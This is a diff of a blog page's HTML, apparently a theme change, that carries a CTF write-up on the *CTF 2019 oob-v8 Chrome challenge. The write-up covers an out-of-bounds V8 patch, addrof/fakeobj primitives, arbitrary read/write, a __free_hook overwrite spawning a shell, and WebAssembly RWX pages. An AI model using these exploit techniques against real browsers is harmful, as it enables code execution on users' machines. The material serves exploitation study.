@@ -1,75 +1,208 @@
 <!DOCTYPE html>
-<html lang="en"><head>
-    <title>ulexec.github.io</title>
-    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
-    <meta content="utf-8" http-equiv="encoding">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="format-detection" content="telephone=no" />
-    <meta name="theme-color" content="#000084" />
-    <link rel="icon" href="https://ulexec.github.io/favicon.ico">
-    <link rel="canonical" href="https://ulexec.github.io">
-    
-    
+<html lang="en">
+<head>
+  
+    <title>*CTF 2019 - oob-v8 :: ulexec.github.io</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This post will cover the chrome exploit challenge oob-v8 from *CTF. The challenge can be found here.
+01 -Analyzing the Patch if we take a close look at the patch oob.diff from the *CTF v8-oob challenge we will observe the introduction of the ArrayOob function. Authors of this challenge didn&amp;rsquo;t really wanted to make the discovery of the vulnerability a hard task, and there are even comments for the read/write primitives." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://ulexec.github.io/post/2021-05-20-startctf2019_oobv8/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://ulexec.github.io/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://ulexec.github.io/img/theme-colors/blue.png">
+  <link rel="apple-touch-icon" href="https://ulexec.github.io/img/theme-colors/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="*CTF 2019 - oob-v8">
+<meta property="og:description" content="This post will cover the chrome exploit challenge oob-v8 from *CTF. The challenge can be found here.
+01 -Analyzing the Patch if we take a close look at the patch oob.diff from the *CTF v8-oob challenge we will observe the introduction of the ArrayOob function. Authors of this challenge didn&amp;rsquo;t really wanted to make the discovery of the vulnerability a hard task, and there are even comments for the read/write primitives." />
+<meta property="og:url" content="https://ulexec.github.io/post/2021-05-20-startctf2019_oobv8/" />
+<meta property="og:site_name" content="ulexec.github.io" />
+
+  
+    <meta property="og:image" content="https://ulexec.github.io/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="writeup" />
+
+
+  <meta property="article:published_time" content="2021-04-08 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
 </head>
-<body class="bootstra-enable-cursor ">
-<nav class="navbar navbar-expand-lg navbar-dark bg-primary">
-    <a class="navbar-brand" href="https://ulexec.github.io">ulexec.github.io</a>
-    <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#main-nav" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
-        <span class="navbar-toggler-icon"></span>
-    </button>
-    <div id="main-nav" class="collapse nav-collapse">
-        <ul class="navbar-nav">
-              
-            <li class="nav-item ">
-                <a class="nav-link" href="/post/">
-                                    
-                                    <span>Archives</span>
-                                </a>
-            </li>
-              
-            <li class="nav-item ">
-                <a class="nav-link" href="/publications/">
-                                    
-                                    <span>Publications</span>
-                                </a>
-            </li>
-              
-            <li class="nav-item ">
-                <a class="nav-link" href="/projects/">
-                                    
-                                    <span>Projects</span>
-                                </a>
-            </li>
-              
-            <li class="nav-item ">
-                <a class="nav-link" href="/bugs/">
-                                    
-                                    <span>Bugs</span>
-                                </a>
-            </li>
-              
-            <li class="nav-item ">
-                <a class="nav-link" href="/about/">
-                                    
-                                    <span>About</span>
-                                </a>
-            </li>
-             
-        </ul>
-    </div>
-    </div>
-    </div>
-</nav><div id="content" class="container">
+<body class="blue">
 
-<div class="row">
-    <div class="col">
 
-        <h1 class="mb-3">*CTF 2019 - oob-v8 - Thu, Apr 8, 2021</h1>
+<div class="container center headings--one-size">
 
-        <p class="lead"></p>
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/post/">
+  <div class="logo">
+    ulexec.github.io
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/post/">Archives</a></li>
+        
+      
+        
+          <li><a href="/publications/">Publications</a></li>
+        
+      
+        
+          <li><a href="/projects/">Projects</a></li>
+        
+      
+        
+          <li><a href="/bugs/">Bugs</a></li>
+        
+      
+        
+          <li><a href="/about/">About</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/post/" >Archives</a></li>
+        
+      
+        
+          <li><a href="/publications/" >Publications</a></li>
+        
+      
+        
+          <li><a href="/projects/" >Projects</a></li>
+        
+      
+        
+          <li><a href="/bugs/" >Bugs</a></li>
+        
+      
+        
+          <li><a href="/about/" >About</a></li>
+        
+      
+      
+        <li>
+          <ul class="menu">
+            <li class="menu__trigger">&nbsp;▾</li>
+            <li>
+              <ul class="menu__dropdown">
+                
+                  
+                    <li><a href="/about" >About</a></li>
+                  
+                
+              </ul>
+            </li>
+          </ul>
+        </li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://ulexec.github.io/post/2021-05-20-startctf2019_oobv8/">*CTF 2019 - oob-v8</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2021-04-08</time><span class="post-author">ulexec</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://ulexec.github.io/tags/pwn/">pwn</a>&nbsp;
+      
+      #<a href="https://ulexec.github.io/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="https://ulexec.github.io/tags/chrome/">chrome</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
         <p>This post will cover the chrome exploit challenge <code>oob-v8</code> from *<em>CTF</em>.
 The challenge can be found <a href="https://github.com/Changochen/CTF/raw/master/2019/*ctf/Chrome.tar.gz">here</a>.</p>
-<h1 id="01--analyzing-the-patch">01 -Analyzing the Patch</h1>
+<h1 id="01--analyzing-the-patch">01 -Analyzing the Patch<a href="#01--analyzing-the-patch" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>if we take a close look at the patch <code>oob.diff</code> from the *<em>CTF</em> v8-oob challenge we will observe the introduction of the <code>ArrayOob</code> function. Authors of this challenge didn&rsquo;t really wanted to make the discovery of the vulnerability a hard task, and there are even comments for the read/write primitives.
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
 </span></span><span style="display:flex;"><span>index 8df340e..9b828ab 100644
@@ -109,7 +242,7 @@ If arguments are greater than 2, the function returns an undefined value</li>
 <li>If the number of arguments is 1, meaning no arguments other than <code>this</code>, then the function will return the element at position <code>elements[length]</code>. This denotes an OOB read by one index, as the real index of the first element should be 0.</li>
 <li>If the number of arguments is 2, meaning one additional argument apart from <code>this</code>, the element at index <code>elements[length]</code>, will be set to the value of <code>value</code>. That denotes an OOB write by one index.</li>
 </ul>
-<h1 id="02---leveraging-the-oob-vulnerabilities">02 - Leveraging the OOB vulnerabilities</h1>
+<h1 id="02---leveraging-the-oob-vulnerabilities">02 - Leveraging the OOB vulnerabilities<a href="#02---leveraging-the-oob-vulnerabilities" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>As we were able to analyze, we essentially have two vulnerabilities. An OOB read and an OOB write.</p>
 <p>How can we leverage these vulnerabilities? Thats exactly the question we will be answering in this section.</p>
 <p>First of all, we know that the vulnerable code, only affects arrays as is implemented as an array property.</p>
@@ -245,7 +378,7 @@ Therefore, we should consider using an Array of elements of kind <code>PACKED_DO
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                     ^--- return of obj_arr.oob()
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd4820</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000176d4ccd47f1</span>	<span style="color:#ae81ff">0x0000000200000000</span></span></span></code></pre></div>
 We can observe that on an JSArray of objects, elements layout is stored very similarly as in a <code>PACKED_DOUBLE_ELEMENTS</code> JSArray containing doubles, despite the fact that the element kind of a JSArray of objects is of <code>PACKED_ELEMENTS</code>.</p>
-<h1 id="03---the-addrof-and-fakeobj-primitives">03 - The AddrOf and FakeObj Primitives</h1>
+<h1 id="03---the-addrof-and-fakeobj-primitives">03 - The AddrOf and FakeObj Primitives<a href="#03---the-addrof-and-fakeobj-primitives" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>We covered that thanks to the OOB read vulnerability, we can leak the map of a <code>JSArray</code> of objects and a <code>JSArray</code> of doubles. But lets remember that we also have a OOB write primitive. Could we overwrite the map of one object with another? Lets find out:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> arr_float <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">2.2</span>]
 </span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> arr_float_map <span style="color:#f92672">=</span> arr_float.<span style="color:#a6e22e">oob</span>()
@@ -325,7 +458,7 @@ From now on we will refer to these primitives as <code>addrof</code> and <code>f
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// returning tagged pointer of arbitrary address
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fake</span>;
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
-<h1 id="04---introducing-an-arbitrary-read-primitive">04 - Introducing an Arbitrary Read Primitive</h1>
+<h1 id="04---introducing-an-arbitrary-read-primitive">04 - Introducing an Arbitrary Read Primitive<a href="#04---introducing-an-arbitrary-read-primitive" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Since we have the capability of knowing the address of objects, and to create an object in any arbitrary address that we wish thanks to the previous <code>addrof</code> and <code>fakeobj</code> primitives accordingly, the realization of an arbitrary read primitive is fearly straight forward:</p>
 <ol>
 <li>The first step is to create a fake FixedDoubleArray object via <code>fakeobj</code>. We can do this by creating a &ldquo;crafted&rdquo; array, in which its first element is a DoubleArray map. We should create our fake object on top of our crafted array <code>elements</code> object, taking into account that elements in a FixedDoubleArray will be stored <code>-0x20 bytes</code> from the actual address of the given JSArray object address.</li>
@@ -393,7 +526,7 @@ Therefore, when v8 tries to access the first element of an JSarray object, it wi
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Index 0 will then return the value at read_addr
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">fake</span>[<span style="color:#ae81ff">0</span>]);
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
-<h1 id="05---introducing-an-arbitrary-write-primitive">05 - Introducing an Arbitrary Write Primitive</h1>
+<h1 id="05---introducing-an-arbitrary-write-primitive">05 - Introducing an Arbitrary Write Primitive<a href="#05---introducing-an-arbitrary-write-primitive" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>One could argue that to achieve an arbitrary write primitive would be as simple as achieving an arbitrary read primitive, however this is not the case unfortunately.
 We can use the same concept as to leverage our <code>fakeobj</code> primitive, but with a twist.</p>
 <p>we can write an intial write primitive following the previous implementation of <code>addrof</code>:</p>
@@ -470,13 +603,13 @@ By applying this technique, we can observe that the write does not SEGFAULT any 
 </span></span><span style="display:flex;"><span>[Detaching vfork parent process <span style="color:#ae81ff">65392</span> after child exec]
 </span></span><span style="display:flex;"><span>[Inferior <span style="color:#ae81ff">1</span> (process <span style="color:#ae81ff">65392</span>) detached]
 </span></span><span style="display:flex;"><span>process <span style="color:#ae81ff">65394</span> is executing new program: <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>dash</span></span></code></pre></div>
-<h1 id="06---exploitation">06 - Exploitation</h1>
-<h3 id="version-information">Version information:</h3>
+<h1 id="06---exploitation">06 - Exploitation<a href="#06---exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h3 id="version-information">Version information:<a href="#version-information" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/v8/out.gn/x64.release$ uname -a
 </span></span><span style="display:flex;"><span>Linux ubuntu 5.8.0-50-generic <span style="color:#75715e">#56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
 </span></span><span style="display:flex;"><span>/v8/out.gn/x64.release$ ./d8 -v
 </span></span><span style="display:flex;"><span>V8 version 7.5.0 <span style="color:#f92672">(</span>candidate<span style="color:#f92672">)</span></span></span></code></pre></div>
-<h3 id="0601---overwritting-__free_hook-to-system">06.01 - Overwritting __free_hook to system</h3>
+<h3 id="0601---overwritting-__free_hook-to-system">06.01 - Overwritting __free_hook to system<a href="#0601---overwritting-__free_hook-to-system" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">/// Helper functions to convert between float and integer primitives
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>); <span style="color:#75715e">// 8 byte array buffer
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f64_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">buf</span>);
@@ -616,7 +749,7 @@ By applying this technique, we can observe that the write does not SEGFAULT any 
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">exploit</span>();</span></span></code></pre></div>
-<h3 id="0602---rwx-webassembly-pages">06.02 - RWX WebAssembly pages</h3>
+<h3 id="0602---rwx-webassembly-pages">06.02 - RWX WebAssembly pages<a href="#0602---rwx-webassembly-pages" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>The previous methodology seems to only work from the d8 shell, however when the exploit is attempted from Chronium, it doesnt seem to work. It looks like the way to conduct the various leaks is not appropiate, as its likely that Chromium may have a different memory layout than the standalone d8 shell. However, there is a more reliable way (without sandboxing) of executing arbitrary code in Chromium using <code>WebAssembly</code> instances, as is possible the <code>RXW</code> memory gets delegated for these  objects. We can see this below:
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> vmmap
 </span></span><span style="display:flex;"><span>LEGEND: STACK <span style="color:#f92672">|</span> HEAP <span style="color:#f92672">|</span> CODE <span style="color:#f92672">|</span> DATA <span style="color:#f92672">|</span> RWX <span style="color:#f92672">|</span> RODATA
@@ -895,86 +1028,43 @@ By applying this technique, we can observe that the write does not SEGFAULT any 
 </span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;</span></span></code></pre></div></p>
 
+      </div></div>
 
-    </div>
-</div>
-<div class="row align-center">
-    <div class="col">
-        <a href="https://ulexec.github.io" class="btn btn-primary btn-lg">Back to Home</a>
-    </div>
-</div>
+  
 
-
-    </div><footer class="container">
-    <hr class="soften" />
-    <p class="text-center">
-    Content Licensed under <a href="">MIT</a> | 
-
-
-&copy;&nbsp;
-
-
-
-    Ignacio Sanmillan
-
-
-
-<span id="thisyear">
-    2023
-</span>
-
-
-
-
-</p>
-    <p class="text-center">
-        
-
-        
-            <a href="https://twitter.com/ulexec">Twitter</a>
-        
-
-        
-            <a href="https://linkedin.com/in/ignacio-sanmillan-1aa244b8">Linkedin</a>
-        
-
-        
-            <a href="https://github.com/ulexec">GitHub</a>
-        
-
-        
-    </p>
-</footer>
-</body><link rel="stylesheet" href="/css/bootstrap.min.css">
-<link rel="stylesheet" href="/css/bootstrap-theme.min.css">
-<link rel="stylesheet" href="/css/style.css"> 
-<script src="/js/jquery.js"></script>
-<script src="/js/bootstrap.min.js"></script>
-
-<script>
+  
     
-    function ThisYear() {
-        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
-    };
-</script>
-<script>	
-	
-(function(){
-  _386.magicCursor();
-  _386.scrollLock();
-  $('[data-toggle="tooltip"]').tooltip();
-  $('[data-toggle="popover"]').popover();
 
-  $(window).scroll(function() {
-    var top = $(document).scrollTop();
-    if(top > 50)
-      $('#home > .navbar').removeClass('navbar-transparent');
-    else
-      $('#home > .navbar').addClass('navbar-transparent');
-  });
+  
+</article>
 
-  $("a[href='#']").click(function(e) {
-    e.preventDefault();
-  });
+  </div>
 
-})();</script></html>
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
